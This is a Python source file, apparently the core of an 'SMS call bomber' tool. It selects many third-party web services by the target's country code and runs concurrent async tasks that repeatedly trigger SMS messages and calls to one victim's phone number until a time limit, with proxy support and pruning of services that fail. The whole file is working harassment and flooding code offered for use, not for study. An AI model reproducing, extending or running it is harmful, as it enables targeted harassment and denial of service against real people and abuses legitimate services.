import threading
import time
import random
from smscallbomber.service import Service
from smscallbomber.Services import urls
from requests import exceptions
import asyncio
from aiohttp import ClientSession, ClientTimeout
from itertools import cycle
import logging

def get_services(country_code, number):
    services = []
    for service in urls(number):
        if service['info']['country'] == 'ALL' or service['info']['country'] == country_code:
            services.append(service)
    return services

class SMSCallBomber(threading.Thread):
    def __init__(self, args):
        self.args = args
        if self.args.country == '7':
            self.country_code = 'RU'
        elif self.args.country == '375':
            self.country_code = 'BY'
        elif self.args.country == '380':
            self.country_code = 'UA'
        elif self.args.country == '998':
            self.country_code = 'UZ'
        else:
            self.country_code = 'ALL'
        self.services = get_services(self.country_code, self.args.phone)
        self.successful_count = 0
        self.failed_count = 0
        self.running = True

    def run(self):
        asyncio.run(self._run())

    async def _run(self):
        async with ClientSession(timeout=ClientTimeout(total=self.args.timeout)) as session:
            tasks = []
            for _ in range(self.args.threads):
                task = asyncio.create_task(self.attack(session))
                tasks.append(task)

            await asyncio.gather(*tasks)

    async def attack(self, session):
        local_successful_count = 0
        local_failed_count = 0
        for service_info in cycle(random.sample(self.services, len(self.services))):
            if time.time() >= self.args.time or not self.running:
                break

            service = Service(service_info, self.args.phone, self.args.timeout, self.args.proxy)
            domain_name = service.get_domain_name()
            try:
                status_code = service.send_request()
                if status_code == 200:
                    local_successful_count += 1
                else:
                    self.services.remove(service_info)
                    local_failed_count += 1
            except exceptions.ReadTimeout:
                logging.info(f"Fail - {domain_name} - ReadTimeout")
                local_failed_count += 1
                if service_info in self.services:
                    self.services.remove(service_info)
            except exceptions.ConnectTimeout:
                logging.info(f"Fail - {domain_name} - ConnectTimeout")
                local_failed_count += 1
                if service_info in self.services:
                    self.services.remove(service_info)
            except exceptions.ConnectionError:
                logging.info(f"Fail - {domain_name} - ConnectionError")
                local_failed_count += 1
                if service_info in self.services:
                    self.services.remove(service_info)
            except Exception as err:
                logging.error(f"{err}")
                local_failed_count += 1
                if service_info in self.services:
                    self.services.remove(service_info)
            except (KeyboardInterrupt, SystemExit):
                exit()

        self.successful_count += local_successful_count
        self.failed_count += local_failed_count

    def send_report(self):
        return self.successful_count, self.failed_count

    def stop(self):
        self.running = False